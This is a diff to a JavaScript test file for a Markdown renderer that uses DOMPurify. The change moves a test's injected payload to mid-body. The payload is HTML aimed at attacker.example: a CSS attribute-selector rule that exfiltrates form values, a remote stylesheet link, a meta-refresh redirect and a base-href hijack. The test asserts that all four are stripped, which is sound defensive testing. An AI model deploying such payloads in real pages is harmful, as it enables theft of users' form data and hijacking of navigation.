@@ -51,25 +51,31 @@ describe('renderMarkdown — 生产路径（DOMPurify 消毒激活）', () => {
     expect(html).toContain('class="katex"')
   })
 
-  it('文档级样式注入面封闭：<style>/<link>/<meta refresh>/<base> 必须被剥', () => {
-    // DOMPurify html 档不放行这四种文档级元素（2026-11-05 实测锁定）：
-    // <style> 能全文档改写界面（伪造"会话过期"弹窗）并借属性选择器 +
-    // url(...) 外泄表单值；<link> 引入任意远程样式表；<meta refresh> 与
-    // <base> 劫持导航与相对地址。一旦未来 ADD_TAGS 误放行，本用例即红。
+  it('文档级样式注入面封闭：<style>/<link>/<meta refresh>/<base> 必须被剥（mid-body 形态）', () => {
+    // 载荷必须 mid-body（正文在前、样式块在后）——题面天然形态，也是 marked
+    // 的真实输出位置。置于片段开头时 <style> 被 HTML 解析器归入 <head>，
+    // WHOLE_DOCUMENT=false 只处理 body，元素静默消失只是**位置伪象**而非
+    // 白名单剥除（2026-11-05 评审轮 4 实测：leading 剥除、mid-body 存活）。
+    // 机制分工：<style> 由 FORBID_TAGS 显式禁（html 档白名单实际含 style）；
+    // <link>/<meta>/<base> 不在档内、白名单剥。四者全文档级：伪造弹窗、
+    // 属性选择器 + url(...) CSS 外泄、远程样式表、导航与相对地址劫持。
+    // 未来若有人移除 FORBID_TAGS 或 ADD_TAGS 误放行，本用例即红。
     const payload = [
       '<style>input[value^=a]{background:url(http://attacker.example/a)}</style>',
       '<link rel="stylesheet" href="http://attacker.example/x.css">',
       '<meta http-equiv="refresh" content="0;url=http://attacker.example/">',
       '<base href="http://attacker.example/">',
     ].join('')
-    const html = renderMarkdown(`${payload}\n\n正文 $a+b$`, '')
+    const html = renderMarkdown(`正文段 $a+b$ 先行\n\n${payload}\n\n尾段`, '')
     expect(html).not.toContain('<style')
     expect(html).not.toContain('<link')
     expect(html).not.toContain('<meta')
     expect(html).not.toContain('<base')
     expect(html).not.toContain('attacker.example')
-    // 存活锚点：消毒链路确实跑过且公式照常渲染（防空窗假绿）
+    // 存活锚点：消毒链路确实跑过且首尾正文与公式照常渲染（防空窗假绿）
     expect(html).toContain('class="katex"')
+    expect(html).toContain('正文段')
+    expect(html).toContain('尾段')
   })
 
   it('消毒与相对图片 URL 改写共存（生产组合行为）', () => {
